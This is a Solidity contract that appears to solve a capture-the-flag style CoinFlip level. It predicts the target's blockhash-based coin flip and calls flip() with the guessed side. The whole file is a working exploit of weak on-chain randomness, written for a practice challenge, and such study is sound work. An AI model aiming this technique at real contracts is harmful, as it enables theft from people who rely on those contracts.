// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol";
import "hardhat/console.sol";
import "./CoinFlip.sol";

contract Level3 {
    using SafeMath for uint256;

    CoinFlip coinFlipContract;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address coinFlipAddr) public {
        coinFlipContract = CoinFlip(coinFlipAddr);
    }

    function main() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
    }
}
